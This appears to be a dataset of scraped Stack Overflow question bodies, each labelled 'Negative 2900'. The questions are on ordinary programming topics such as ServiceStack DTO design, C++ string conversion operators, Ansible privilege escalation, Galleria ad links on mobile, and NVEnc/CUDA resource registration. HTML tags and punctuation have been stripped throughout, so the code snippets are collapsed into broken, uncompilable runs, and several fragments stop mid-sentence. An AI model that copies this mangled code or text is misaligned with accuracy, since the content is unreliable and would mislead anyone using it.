So far, Ive designed my single client request like sop  precode[RouteclientsId, GET] public class ClientRequest  IReturnltClientResponsegt      public string Id  get set    public class ClientResponse  IHasResponseStatus      public MyProject.Common.Models.Client Client  get set      public ResponseStatus ResponseStatus  get set       public ClientResponse              this.ResponseStatus  new ResponseStatus       codepre  pWhich as you can see is simply returning my model class to the client.  With this sort of design, Im completely at a loss of how to properly POST a new client, or UPDATE an existing client.  Also, if I wanted to return a list of all clients, Im currently using the following requestresponse DTOsp  precode[Routeclients, GET] public class ClientsRequest  IReturnltClientsResponsegt    public class ClientsResponse  IHasResponseStatus      public ListltMyProject.Common.Models.Clientgt Clients  get set      public ResponseStatus ResponseStatus  get set       public ClientsResponse              this.ResponseStatus  new ResponseStatus       codepre  pWith a service like sop  precodepublic ClientsResponse GetClientsRequest request      var result  currentSession.QueryltChronologic.Eve.Common.Models.Clientgt.ToList      if result  null         throw new HttpErrorHttpStatusCode.NotFound, new ArgumentExceptionNo clients exist      return new ClientsResponse              Clients  result       codepre  pWhich works, though I feel like this is also not the best way to achieve what I am attempting to do, and gives me an ugly metadata page showing like sop  pimg srchttpi.stack.imgur.comceCtK.png altUgly ServiceStack metadatap  pI feel like Im overlooking quite simple with this design, and if anyone could suggest to me how to streamline the design it would be greatly appreciated.p  pThank you.p
Negative 2900 pI have several database tables that the user should be able to add, edit and remove entries from the web application. Also the input must be validated before persisting it.p  pNow I could simply make a table and put labeled input fields in there, but the result would be far from DRY and a horror to maintain. Composite components make this just a bit better. Is there any alternative I do not see which could reduce a lot of workp

Negative 2900 pIm writing a small app based on John Papas Hot Towel template, meaning MVC 4 and Durandal. As someone with mostly MVC experience it seems most correct to use MVCs Models with their Data Annotations for validation. I also dont want to write the viewmodels OR the validation twice, which seems a reasonable enough desire.p  pSo far Ive easily figured out how to use codeko.mappingcode for loading the ViewModel and its data from the server side using JSON, and binding my form to it.

Negative 2900 pI am trying to make utility for converting strings as I have a bad mix of interfaces needing strings in various containers char, stdstring, custom string type and formats utf8, utf16, utf32. So I had the idea to create a wrapper with cast operators to the various types. Like thisp  precodeinclude ltiostreamgt include ltstringgt  struct X      operator stdstring  return stdstringstring x      operator const char   return zstring x    X makex  return X   int main      stdstring y  makex  this works     stdstring ymakex  but this does not     y  makex  this does not work either     y  stdstringmakex  nor does this, so its about useless     stdcout ltlt y ltlt stdendl     return 0  codepre  pBut the problem is that if the type converts to both codechar code and codestdstringcode, the codestdstringcode constructor and assignment will be ambiguous between those two types. And I dont want to go through just codechar code, because the string may be originally given by range rather than as nul terminated, requiring extra copy to get a nul terminated one as well as making embedded nuls not work.p  pSo is there any way to disambiguate thesep  pImportant note I am stuck with some C03 compilers, so neither cast operator can be marked explicit.p

Negative 2900 pIm converting some django views to be class based, and so far loving the flexibility.p  pMost of my views subclass from a parent view codeClubViewcode. Each subclassed view that needs to handle a codepostcode method override needs to have access to the corresponding codeclubcode value.p  pThis value is in the URL, so the request variable has it. However, is there a way for me to grab this value, and fetch the corresponding club object outside of the codepostcode method like a codeprepostcode method or something.

Negative 2900 pI have a rest service developed in Java that runs on Apache Tomcat.  This service is implemented by a class and I explicitly defined a constructor for it. Im load testing it and I found out the constructor is being called multiple times. Then the number of resources being allocated in the constructor is continuously increasing and probably faster than the GCs freeing resources. Im trying to understand the reason why the constructor is called multiple times. I suppose the service is being unloaded too fast by Apache and then it has to be created again to process a new request.

Negative 2900 pHey was wondering if anyone could help me, im getting to know cassandra but I was curious and wanted to measure how many disk IOs were occuring when i was reading from column families. p  pI looked at opscentre profiler but the only metric i could find was DIsk Utilisation but from what i understand this is the time the CPU spends doing disk IO so im guessing its measuring stuff like context switch time. However since it does this i thought maybe there must be a point when cassandra realises it does have to go to disk then i could just put a counter there.p  pThe other option could be put two timestamps round the read call and if its in the order of ms then i know its a disk read. However im not entirely sure where the system call is, i thought i located it in RandomAccessReader in the reBuffer method int n  super.readbuffer, read, buffer.length  read however it doesnt seem that way when I query the column families.p  pIn short, any ideas on how to figure out the number of disk IOs that are occuringp

Negative 2900 pIm attempting to integrate a third party monitoring solution New Relic into my Android app, which uses an antbased build.  The integration instructions say to set the codeANTOPTScode environment variable to codejavaagentpath to a jar filecode before executing the ant command to perform the build.p  pThis works swimmingly when I launch my ant build manually from the command line.p  pHowever, we also launch ant builds via Jenkins.  In the Jenkins build configuration theres a section for configuring your ant builds.  In this section is an entry called Java Options.  From searching elsewhere Ive gathered this is the place to put JVM arguments. Typically people want to increase the max heap size, etc.p  pSo I put this in the Java Options sectionp  pcodejavaagentpath to a jar filecodep  pThe Jenkins builds, however, fail during the Android dex target as followsp  precode  [dex] input Usersbuilduser.jenkinsjobsAndroid  Latestworkspaceandroidbinproguardobfuscated.jar   [dex] [newrelic.info] Detected the New Relic Android agent in an Ant build Usersbuilduser.jenkinsjobsAndroid  Latestworkspaceandroidbinproguardobfuscated.jar   [dex] Converting compiled files and external libraries into Usersbuilduser.jenkinsjobsAndroid  Latestworkspaceandroidbinclasses.dex...

Negative 2900 pI am trying to bind a ListBox Control in C Winforms in .NET 4.5 to a list of objects that have a nested property that I wish to use for a DisplayMember. It sort of works except that when I set the DisplayMember to the nested property the listbox only shows one item even though there are two items in the list that it is bound to. If I comment out the code for setting the DisplayMember the listBox shows two items.

Negative 2900 pi used mysql as my RDBMS and recently i have heard that you should not insert null in your DB, i mean instead of having a lot of fields that they may or may not have value create a field and insert a data type like JSON in it. e.g. i have table named as message it contains fields like MessageTypeit can be a map a video a photo or text,... and it also has fields likelatitude,longitude for map,photoid,photoPath,photoHash,... for photo,videourl,videoHash,videoId,... and so on.

Negative 2900 pI am trying to communicate with an SD card using an arduino, I got everything working using SPI but I found out that latest eMMC cards dont suport SPI more anymore and I need to communicate with an MMC somehow. My only problem is that I dont know how 1bit mode works, I searched everywhere on the internet and from what I understood it uses only a DO line which is data in for the host and a DI line which is data input for the host. I cant find any good documentation or an example of how to do this 1bit mode instead of using the old and good SPI mode. What my current code is doing is to initialize the SD card in spi mode, wait for the user to press a button to lock the card and another button to unlock it using CMD42. Is there any good example for arduino how to use 1bit, or anyone could help me with a simple code which can initialize, send bytes to the card and then receive them. p

Negative 2900 pI am puzzled with how to use Async. I am wanting it to update the UI as soon as a button is clicked without having to kill the activity and re instantiate it. In the background, I want it to be waiting for the click to update the UI, and after the click I want it to determine whether or not the correct button was clicked. I am using the boolean isUserRight to determine whether or not the answer is correct, and after that I am using resetButtons to reset the buttons obviously and then setButtons to change the button. I have the methods all written out, I just dont know how to implement them into Async. I need the UI to be updated instantly to change the color of a button. I dont need help with any of the methods, button color, etc, just the Async, and Im not asking anybody to spoonfeed me either, just give me a little push on where to go. Any help would be nice, thanks guysp  pTLDR need to update UI after button is pushed using async so the button color doesnt get stuck and I dont have to restart the activity to update the UI. I dont need the whole code, just a little guidance on where to go.p  pEdit Added some code.p  pThis is on my onCreatep  precodebuttons[0]  ButtonfindViewByIdR.id.b0     buttons[1]  ButtonfindViewByIdR.id.b1     buttons[2]  ButtonfindViewByIdR.id.b2     buttons[3]  ButtonfindViewByIdR.id.b3     buttons[0].setOnClickListenerthis     buttons[1].setOnClickListenerthis     buttons[2].setOnClickListenerthis     buttons[3].setOnClickListenerthis codepre  pthen under my onClick, I have a switch for the buttons which all go to this methodp  precode    public boolean isUserRight          ifcorrect  1                onButton             return true             Toast.makeTextgetApplicationContext, Good job, Toast.LENGTHSHORT.show             buttons[test].getBackground.setColorFilterColor.GREEN, PorterDuff.Mode.MULTIPLY                  onButton         return false            public void onButton          int rnd  new Random.nextIntbuttons.length         test  rnd         buttons[rnd].getBackground.setColorFilterColor.YELLOW, PorterDuff.Mode.MULTIPLY         ResetButtons      codepre  pAnd this works fine, the only problem is after the first button being clicked, the colors stop changing and getting updated.p

Negative 2900 pI have a PC that has two PCI cards connected to it. Ive created a MatlabSimulink simulation which sends a digital signal out to one of the cards. The card is a DA converter. It then outputs this signal to a control system. Matlab generates C code to do this. My objective is to recreate this simulation with an FPGA board. Unfortunately I cannot connect the PCI cards to the board. Therefore, the FPGA will have to access the PCs PCI ports. It will be connected through USB and Im using Quartus as the FPGA software. IS there any way to access the PCI cards from the board Or would there be any way to just have the FPGA call the simulation code. p

How would I do thatp  h3Knowing how Ansible will gain rooth3  pAs far as I understand, you can set what user Ansible will connect to the server youre maintaining by defining user and the beginning of the playbook file. Heres what I dont understand if I tell it to connect via my username, emjoeem, and ask it to update a package via the apt module, how will it gain root Sudo usually prompts me for my password, and Id prefer keeping it that way for security.p  h2Final requesth2  pIve scoured the Ansible docs, done some what I thought was thorough Googling, and generally just tried to figure it out on my own, but this information continues to illude me.p  pI am very new to Ansible, and while its mostly straightforwards, I would benefit greatly if I could understand exactly how ansible runs, on which users it runs, and howwhere I can specify what user to use at different times.p  pThank you tons in advancep

Negative 2900 pI am working on an user interface that shows many pins on a map. During the development I am randomly generating 1500 map pins just to be placed on the map to test lookfeelperformance etc. issues.p  pThe code which does that looks like thisp  precode    for var i  0 i lt 1500 i  1          scope.mapPins.push             latitude Math.random  2  51,             longitude Math.random  4  3,             icon themeImages[Math.floorMath.random  themeImages.length],             title Sample title,             infoContent Sample content               codepre  pNaturally the area of the pins covered is a rectangle for latitudes 5153 and longitudes 37. For those who are wondering where it is, it is the area roughly around Netherlands.p  pNow, theres a little problem that the Netherlands is not a rectangular area and a lot of these coordinates fall over the sea and I would like my coordinates to be only on the land.p  pstrongIs there a witty mathematical way how I can pool coordinates from a nonrectangular areastrong p  pOf course I could make a google.maps polygon object that covers a nonrectangular shape and then via google api test every random generated pin whether it falls within the bounds of this shape etc, but that would be an overkill for UI design phase. Basically my question is whether there is a neat mathematical trick that would allow me to randomly generate coordinates from a nonrectangular space.p

Negative 2900 pIm using Jquery steps wizard plugin. The problem I am having is that each step of the wizard has content of a different height. The css included with the examples to control the height for the content is p  precode.wizard gt .content      background eee     display block     margin 0.5em     minheight 35em     overflow hidden     position relative     width auto      webkitborderradius 5px     mozborderradius 5px     borderradius 5px  codepre  pI have tweaked the minheight and overflow properties, but it still doesnt do what I want to accomplish. What I want is the height to be only high enough to accommodate the content for each step. p  pFor example, say I have 2 fields for step 1 and 10 fields for step 2. In the examples the content is all the same height so it looks terrible having a much larger height than is necessary for the 2 fields to accommodate the 10 fields on step 2. p  pIf I remove the minheight property, no content shows at all. Does Jquery steps require a fixed height to work for all steps Im hoping there is a way to make the height dynamic to accommodate the height of each individual step.p  pThank youp

Negative 2900 pIn my UML class diagrams I usually do object collections by placing the attribute name above the arrow that relates both classes as opposed to the other notation that just adds the attribute with brackets indicating the multiplicity.

Negative 2900 pThe question sounds more complicated than it actually is. I have a simplified example below. Pink highlights indicate the differences between two classes. As you can see, the only real difference is in the enum type that is used. All other code is identical. Is there any way to use inheritance andor templation to have only one GetTrialType method in my entire codebase I am showing two derived classes in this example NBACK and COLOR, but in actuality there are hundreds of classes derived from the Task class. This means if I have to make one change to the GetTrialType method, I will actually have to make 100 updates. How can I prevent this when different types are usedp  pimg srchttpi.stack.imgur.comxc7RT.png altDiffp

It shows that my custom object was converted to a null type hex value of zero.p  pSo the issue appears to be in resgen itself.  I also learned that the issue is related to my custom TypeConverter.  My custom TypeConverter is used to deserialize my codeLogPaircode as JSON.

Negative 2900 pI would like to write a 3D application using Golang, my favorite programming language. However, I would prefer not to use native OpenGL directly as the graphical frontend as this would entail a larger learning curve than Im willing to tolerate. Additionally, I dont really want to use a Golang game engine like gongine. p  pAfter doing some research I found out about the amazing WebGL Javascript library three.js and I was so intrigued that I completed an introductory Javascript course in a few hours. Im not really a web developer at all, so Im wondering how practical it would be for me to write my application primarily in Go but with a three.js frontend.p  pSome specific questionsp  ul liIs it worthwhile  practical to use Javascriptthree.js as a frontend to a Golang server like thisli liIf it is worthwhile, where can I look to learn how to integrate the two cleanlyli liIf it isnt really worthwhile, which alternatives do I haveli ul  pThanks, any response appreciated.p  h2Edith2  blockquote   pDo you plan to make operations on geometry in Go, possibly in realtime and communicate with your Javascript layer using Websocketsp blockquote  pYes, this is what Im thinking now. Im intending my Golang program to generate streams of vertices and triangles based on a few parameters from the user. Each structure is generated all at once after the users supply their parameters which I see as slider bars  input boxes on a Javascript frontend.p  pHeres an example of something the Go program might generate, plotted in GNUPlot img srchttpdrive.alexozer.comhelixfractal.png altpicp  blockquote   pIf this is the case you underestimate Javascript a bit. You should write most of your application in Javascript and use Go as a classical backend service layer like user accounts, persisting state, etc.p blockquote  pId be fine with doing that, except for these reasonsp  ulliThe core generating process fundamentally depends on Goroutines and channelsli liI know close to nothing about web development, including frontend and backendliul  pSo I suppose Im asking about the implementation details of one of these three possibilities liWriting most of the program, including the generator, in JS, and a minimal backend in Goli liWriting most of the program in Go and using JS just as a graphical frontendli liSomething elselip

Negative 2900 pI swear I tried to find an answer to this question but cant seem to lick this issue.p  pI have a table view that I would like to take the user to 4 different viewcontrollers as each destination viewcontroller from the menu needs very different functionalitylayout.  However, at present I can only go to one view controller.  If I simply put in buttons instead of the table view I can accomplish this but this doesnt seem like best practice and I enjoy some of the cleantightness of the table view.  Also, I do not need to pass anything from the parent viewcontroller.p  pIm new, if my newb question wasnt obvious enough.

Same for the genus Chaetocladius which although it appears once in RM0.7 is present 5 times in the sample, so I would keep it. p  pAlso, for cases where the one level appears enough times to keep there are those to the right that are rare and need to be removed and replaced with NA instead.

From my understanding, a data storage is on a different level from data structure but overlaps, for example, data structure is the arrangement of data in memory, as well as disk storages. p  pI need to use another file file2, which is given and then compare each value with the value in the first given file file1, to see if its there or not. p  pWhen comparing between files, I would dump the results in another file file3. This file will be structured into different columns since I mentioned columns, perhaps use database for the results instead of file3p  pBased on what I said above, it looks like I am just looking for quick searchlookup to compare between files.p  pMy question is, do you think this is better suited for data structure, or should I search the file as is I mentioned that I am just looking for searchlookup operation, I am leaning towards hash table, which has constant time O1 when it comes to search. On the other time, I feel like data structure is an overkill to handle data that is already constructed using different storage mechanism file, and data structure is best left for when entering the data as we go.. p  pHope this makes sense. Am I in the right track of thinkingp

Negative 2900 pIm having a major problem, which is really time consuming, so I was hoping someone has a good solution for me to save both time and effort...p  pI am managing a Magento shop for a client of mine and after a redesign we now developed a new navigation structure.

Negative 2900 pThis goes in the category of a minor, but constant, annoyance.  I am using Eclipse IDE. It very helpfully marks warnings for various coding problems, including p  blockquote   pPotential resource leak connection may not be closedp blockquote  pThis can be a very helpful warning when you are dealing with real resource objects, so I like to leave Eclipse configured to show the warning.  However, when dealing with Mock objects in unit tests in this example, it is a unit test friendly implementation of the codejava.sql.Connectioncode interface., it is a nuisance.  The only way I know of to remove the warning is to add the codeSuppressWarningsresourcecode annotation to the code which is referencing the object.  Unfortunately this has to be done wherever the Mock class is used, which means a lot of repetition for a frequently used Mock class.p  pIs there any class level annotation that I can put on the Mock class to prevent the warning in the first place  Or is there some other means for preventing the warning for classes which dont really have any resource leaksp
Negative 2900 pI want to export the content of an Oracle database on a production environment while the application using that database must be running while the export is being performed. Doing a simple dump into a file, for example by simply selecting the content of a database and writing it table after table into a file using PLSQL, does not seem to guarantee consistency. For example, by writing all content of table B into a file, a previously exported table A might have been changed while table B has been exported. The exported contents of B therefore might reference new data of table A, wich are not part of the export file of table A. I cannot run this export in one big transaction for performance reasons the application is running. p  pWhich techniques, tools, etc. can be used to export a consistent set of data into a file from an Oracle databasep  pThank you very muchp

Negative 2900 pI am writing an application that is interested in the status information from certain network devices. One of the devices provides the status information through Http and uses a multipart message The first time you query the information it sends down the whole status and from then on whenever the status of the device changes a new multipart message is sent down the stream with just the changes.p  pI am using C and am interested in using HttpClient or equivalent to open the stream, read all the information currently in the stream and then monitor this stream for when there is new information so that I can update the status information of the device accordingly in the application.p  pIn essence the code I have looks something like thisp  precodeusing var handler  new HttpClientHandler  Credentials  new NetworkCredentialusername, password       using var client  new HttpClienthandler              var task  client.GetStreamAsyncuri          task.Wait          var stream  task.Result          whiletrue                      byte[] bytes  ReadBytesFromStreamstream              DoSomethingWithBytesbytes           codepre  pThe code in real life runs in a thread however and would need terminated correctly when told to.p  pThe issue I am having is that when there is nothing in the stream the Read call on stream.ReadByte blocks. If I put a ReadTimeout on the stream then when the Read call failsi.e. when no new information is ready then the CanRead property is set to false and I have to restart the process however in doing so recieve all the original status information again instead of only the elements that have changed.p  pIs there something that can be done to keep the stream alive until I tell it to terminate while being able to unblock on the read if no information is available The reason I need to do this is since the application is multithreaded I need to terminate this code safely and the read is stopping the application from closing down.p

Negative 2900 pIm building a bit of a more complex app with AngularFire and Ive been wracking my brain trying to figure out how to retrieve all the data I need, but in a clean, performant, and DRY method.p  pThe data Im working with is basically as followsp  precodeusers   userid     profile     public       instanceid 12345     private instances   instanceid i.e. 12345     ... codepre  pThere are multiple users and multiple instances.

The story is fine in all our developers browsersChrome and firefox.

Negative 2900 pIm writing a rotation matrix function that I want to work with vector inputs.  The goal is to return a cell array of rotation matrices for each of the angles in the vector angle.

Negative 2900 pI am new to swift and am working my way through the Plymouth University lectures on Swift in iTunes U. They had us load 6 images into the media library, each sized specifically for a different orientation of iPhone and iPad. Under media, I drag in the first image, then under width select Any amp Compact which gives me 6 boxes. I follow the onscreen instructor exactly and place each image in the correct corresponding box. Then when I go back to storyboard and select the compact width and regular height orientation and drag the banner which correctly says I have 6 images stored it drags the largest image stored there. Even when I change the orientation to regular regular or any other variation, it always drags the same image and ignores the fact that I have specified which one should come. p  pWhat the heck is wrong here Should it not automatically pull the corresponding picture from banner based on the storyboard settingp  pEdit On Images.xcassets i have Width set to Any amp Compact per instructions  have the top row set to the three sizes for iPads, and bottom row set for three sizes of iPhone p  pOn main.storyboard, frame is set to compactregular.p

Negative 2900 pOn my project, ive drawn a grid using shapeRenderer.line for example shapeRenderer.line1, 12, 2, 12. Ive also added a sprite on it called ball.png. Ive implemented the InputProcessor because I wanted to track down the position of the ball sprite when it moves. Ive output the coordinates on the screen when Ive move it and it returns something like position X 33.0 and position Y 408.0. My question how would I be able to convert the line coordinates so it matches that of the sprite or viceversa After that, I would be able to properly do collision detection by adding all the lines coordinates, which act like walls, inside a collection.p

Negative 2900 pHi guys I could use some help on getting absolute URL links to show images with cakePHP without HTML helper.p  pSo I wrote a webservicewebservice communicates in json for an application that is being ran on iOS. Now the problem is people can upload images from the application to my webservice, they get stored in webrootuploads folder.p  pNow I want to show the images on my application in real size if they click on themusing thumbnails for the smaller ones, using a controller which creates thumbnails the problem is when I point out to webservice.comuploadsimagename, it says controller uploads can not be foundpretty obivous but hey. So my question is how can I get the absolute links to the images without needing a controller, so when I go to the URL of the image it just shows the image in my browser and on my application, and I cant use views for this cause it needs to show on the iOS application.p  pAny help would be greatly appreciated.p  pThanks in advance,p  pSokoop

Negative 2900 pIm implementing a fullscreen gallery using Galleria, a JavaScript gallery framework, within which there will be Google ads every 5 slides or so. This is made possible due to Galleria supporting iframes as well as images. p  pAll media types are added via a JSON array, e.g.p  precodevar data  [      image galleria46092873.jpg,     big galleria46092873.jpg,     title Photo 1 of 9,     description Test caption. ,      image galleria49071086.jpg,     big galleria49071086.jpg,     title Photo 2 of 9,     description Test caption. ,      iframe iframe.html,     title Advertisement,     description Scroll to continue.  ] codepre  pThe working version can be seen here a hrefhttpdev.theyachtmarket.comgallery.html relnofollowhttpdev.theyachtmarket.comgallery.htmlap  pOn desktop machines this functions exactly as expected. The user can scroll through the images and when they reach an advert, a click will open the ads target in a new tab. However on mobile devices iPad and Nexus 4 tested so far, the link doesnt seem to fire and another ad is loaded instead sometimes after a few seconds of a blank screen.p  pInterestingly, if you navigate on a mobile device directly to the page handling the ads a hrefhttpdev.theyachtmarket.comiframe.html relnofollowhttpdev.theyachtmarket.comiframe.htmla and click on the ad, the link functions perfectly.p  pI connected the Nexus 4 phone to my PC in order to inspect the gallery.html page. Markupwise all seems present, its just that the link doesnt function properly.p  pI havent implemented anything like this before, so please accept my apologies if its been done suboptimally. Id happily accept any advice on how to fiximprove the work completed so far.p  pIn short, Im confused as to why the Google Ads links dont work in one specific scenario on a mobile device, via the gallery page but do in all others.p

I want to integrate elasticsearch with it, so that it also indexes these logs based on particular fields and thereby giving faster query results using spark SQL. So, my question is, can I index my data based on particular fields only Also, my logs are saved in avro file format. Does es provides a way to directly index avro serialized data or do I need to convert it into some other formatp  pThank you in advance.p
Negative 2900 pI create an mysqlstatement that paginates the results using codeLIMIT x, ncode where codexcode is the offset and codencode the returned entries.p  pThe offset is created using GETVars in the form of codepagexcode.p  pNow Google has some strange entries in its index that come from old crawls, where the pagevariable exceeds the actual amount of records in the resultset.p  pMeans, the query created with the page variable results in something like codeLIMIT 1000, 30code  but the query will only return code900code entries since the content of the table changed meanwhile. This returns an empty resultset, of course.p  pIs there a way to tell mysql, that if the offset exceeds the returned records to just show the last possible resultset I dont want to make an extra query using codeCOUNTcode first, since this would double the load on the mysqlserver right now Im using codeSQLCALCFOUNDROWScode to determine the total amount of records the query would return without the codeLIMITcodeStatement.p
Negative 2900 pWhile automating testing of a website shopping experience, I am attempting to verify that the subtotal, total, and tax are calculating properly. Since the price andor tax will change in the future, I cannot simply assert the actual price value inside the control. Instead, I would need to build a calculation based upon the controls themselves and assert that quantity multiplied by individual price for each item added together equals the subtotal, and so on.p  pFor example, say my controls for each are named such control names are in asterisksp  precode Quantity  UIItem2Cell  InnerText has a Value of 2   Individual Price  UIItem249Pane  DisplayText has a value of 2.49   Individual Product Total price x qty  UIItem498Pane  InnerText has a Value of 4.98 codepre  pInstead of validating the values are the actual numbers, can I write an assertion formula using the identifiers as variablesp  pemKeep in mind, I am using the Coded UI Test Builder rather than writing the code outright.emp  pIf the Individual Product Total InnerText assertion comparator is AreEqual, can the Comparison Value be something likep  precode UIItem2CellInnerText  UIItem249PaneDisplayText codepre  pA. Is this sort of formula possiblep  pB. If so, how do I write itp  pPlease forgive me, as I am very green when it comes to this.p

Negative 2900 pIm currently using Websockets in a SpringMVC webapp to send notifications to springsecurityauthenticated users at any time.

Negative 2900 pMy application is a communications server that receives TCP messages from a web server and then rebroadcasts the message to a number of iPads. Its a windows forms application in C. Program.cs creates an instance of the primary form and then that form creates four threads that do the communications work. There is a thread that listens for messages from the web server, a thread that processes the incoming messages into the data that needs to be transmitted and a thread that handles sending the outbound messages. The fourth thread does database cleanup and spends 99 of its time sleeping. p  pThe problem Im seeing is the GUI locks up with a load is placed on the system. On incoming message may represent 50 or 100 outgoing messages. While testing Im restricting they system to only send 5 messages out at a time, so it requires a longer transmission time. The sending process is using async call backs, but even it it wasnt, I cant understand why load on the tread could be stalling the GUI thread.p  pIm removed a much of the cross thread communications from the thread to the GUI for status update.

Negative 2900 pI created a macro in Excel to sort a cell range. Running the macro manually through the View Macros window works like intended.p  pHowever, once I assign the macro to a shape, I get the following warning after clicking on the shape [Filename] is already open.

Do you want to reopen [filename]p  pI noticed that after assigning the sorting macro to a shape, the workbook automatically generates a link to itself as seen in the File  Info  Related Documents  Edit Links to Files. When I break the link, the sorting macro is also disassociated form the shape.p  pMaybe it is also helpful to note that the Excel 2013 file is in my synced OneDrive folder on Windows 10.

Negative 2900 pThe question below may sound a bit long and complex, but actually its a quite simple, generic and common problem of three processes working on a same file. In a text below Im trying to decompose the problem into set of particular requirements with some illustrative examples.p  h2Task preambleh2  pThere is a text file, called strongindexstrong, which contains some metadata.p  pThere is an application strongAPPstrong, which understands the file format and perform meaningful changes on it.p  pThe file is stored under version control system strongVCSstrong, which is a source of changes performed on the same file by other users.p  pWe need to design an application emAPPem, that will work with the file in a reasonable file, preferable without interring much with emVCSem, as its assumed that emVCSem is used to keep a large project with the emindexem file being just a small part of it, and user may want to update the emVCSem at any point without considering any ongoing operations within emAPPem. In that case emAPPem should gracefully handle the situation in a way preventing any possible loss of data.p  h2Preable remarksh2  pPlease note that emVCSem is unspecified, it could be perforce, git, svn, tarballs, flash drives or your favourite WWII Morsebased radio and a text editor.p  pText file could be binary, that doesnt change things much. But with emVCSem storage in mind, its prone to be merged and therefore texthumanreadable format is most adequate.p  pPossible examples for such things are complex configurations AI behaviour trees, game object descriptions, resource listings, other things that are not meant to be edited by hand, related to a project at hand, but which history matters.p  pNote that, unless you are keen to implement your own version control system, outsourcing most of the configuration into some external, clientserver based solution does not solve the problem  you still have to keep a reference file within version control system with a reference to a matching version of configuration in question in the database. Which means, that you still have the same problem, but at a bit smaller scale  a single text line in a file instead of a dozen.p  h2The task itselfh2  pA generic emAPPem in vacuum may the emindexem in three phases strongreadstrong, strongmodifystrong, strongwritestrong. The emreadem phase  read and deserialize the file, emmodifyem  change an inmemory state, emwriteem  serialize the state and write to the file.p  pThere are three kind of generic workflows for such an applicationp  ol liemreadem  ltpresent an informationgtli liemreadem  ltpresent an information and await users inputgt  emmodifyem  emwriteemli liemreadem  emmodifyem  emwriteemli ol  pThe first workflow is for readonly users, like a game client, which reads data once and forgets about the file.p  pThe second workflow is for editing application. With external updates being rather rare occurrence and being improbable that user will edit the same file in few editing applications at the same time, its only reasonable to assume, that a generic editing application will want to read the state only once especially if its a resourceconsuming operation and reread only in case of external updates.p  pThe third workflow is for an automated cli usage  build servers, scripts and such.p  pWith that in mind, its reasonable to threat emreadem and emmodifyem  emwriteem separately. Lets call an operation that makes only emreadem phase and prepares some information a strongread operationstrong. And a strongwrite operationstrong would be an operation that emmodifiesem a state from a emread operationem and emwritesem it to the disk.p  pAs workflows one and two may be running at the same time by different application instances, its also reasonable to allow multiple emread operationsem running at the same time. Some emread operationsem, like reads for editing applications, may want to wait until any existing emwrite operationsem are finished to read the most recent and uptodate state. Other emread operationsem, like this in a game client may want to read the current state, whatever it is, without being blocked at all.p  pOn other hand, its only reasonable for emwrite operationsem to detect any other emwrite operationsem running and abort. emWrite operationsem should also detect any external changes made to the index file and abort. Rationale  there is no point to perform and wait for any work, that would be thrown away due to the fact that theyve been made basing on a possible outofdate state.p  pFor a robust application, a possibility for a critical failure of a galaxy scale should be assumed at every single point of an application. Under no circumstances such a failure should left the index file inconsistent.p  h2Requirementsh2  ol lifile emreadsem are consistent  under no circumstances should we read a half of a file before it have been changed or an another half after.li liemwrite operationsem are exclusive  no other emwrite operationsem are allowed at the same time with the same file.li liemwrite operationsem are robustly waitable  we should be able to wait for a emwrite operationem to complete or fail.li liemwrite operationsem are transactional  under no circumstances should the file be left in partially changed or otherwise inconsistent state or based on an outofdate state. Any change to the index file prior or during the operation should be detected and operation should be aborted as soon as possible.li ol

Negative 2900 pI am a newb to unit testing, and attempting to use gmock to mock my class which handles writes to a database.  For this matter, I should also clarify that Im no C expert. Ive used it for several years, but really a C guy at heart, so this could be more of a C issue.br My TEST routine instantiates a class CUT which I want to test a method of foo.  Lets say foo calls a class which I want to mock realDBClass.  Ive created a mockdBClass, but my test code calls the CUT.foo method, and in turn this calls the realdBClass.  This makes sense, since its implemented, so I thought maybe I shouldnt compile the implementation, and so I created default constructordestructor to the .h file of the realDBClass, and tried to compile excluding realDBCLass.cpp  I got linking errors stating that the constructor and destructor wasnt defined as well as any other functions which I hadnt mocked, until I mocked all that I could.   So, what am I doing wrong If I build the implementation file as is done in the examples Ive found it doesnt call my Mocked class, but instead calls the original.  and If I dont compile the originals implementation, the linker fails on the constructor and destructor.  Any help is appreciated.p

Negative 2900 pIve hit a complete brick wall in my attempt to use NVEnc to stream OpenGL frames as H264. Ive been at this particular issue for close to 8 hours without any progress.p  pThe problem is the call to codenvEncRegisterResourcecode, which invariably fails with code 23 enum value NVENCERRRESOURCEREGISTERFAILED, documented as failed to register the resource  thanks NVidia.p  pIm trying to follow a procedure outlined in a hrefhttpheim.ifi.uio.nopaalhstudentsMartinAlexanderWilhelmsen.pdf relnofollowthis documenta from the University of Oslo page 54, OpenGL interop, so I know for a fact that this is supposed to work, though unfortunately said document does not provide the code itself.p  pThe idea is fairly straightforwardp  ol limap the texture produced by the OpenGL frame buffer object into CUDAli licopy the texture into a previously allocated CUDA buffer li limap that buffer as an NVEnc input resourceli liuse that input resource as the source for the encodingli ol  pAs I said, the problem is step 3. Here are the relevant code snippets Im omitting error handling for brevity.p  precode Round up width and height privgtencWidth  resolution.w  31 amp 31, privgtencHeight  resolution.h  31 amp 31   Allocate CUDA pitched memory to match the input texture YUV, one byte per component cuErr  cudaMallocPitchampprivgtcudaMemPtr, ampprivgtcudaMemPitch, 3  privgtencWidth, privgtencHeight codepre  pThis should allocate ondevice CUDA memory the pitched variety, though Ive tried nonpitched too, without any change in the outcome.p  precode Register the CUDA buffer as an input resource NVENCREGISTERRESOURCE regResParams   0  regResParams.version  NVENCREGISTERRESOURCEVER regResParams.resourceType  NVENCINPUTRESOURCETYPECUDADEVICEPTR regResParams.width   privgtencWidth regResParams.height  privgtencHeight regResParams.bufferFormat  NVENCBUFFERFORMATYUV444PL regResParams.resourceToRegister  privgtcudaMemPtr regResParams.pitch  privgtcudaMemPitch encStat  nvEncApi.nvEncRegisterResourceprivgtnvEncoder, ampregResParams                   FAILS privgtnvEncInpRes  regResParams.registeredResource codepre  pThis is the brick wall.

The only observable difference to the original code is that codecuPopContextcode returns an error which can be ignored here  probably my original program creates such a context as a side effect of using OpenGL. Otherwise, the code behaves exactly as the original does. Ive built the code with Visual Studio 2013.
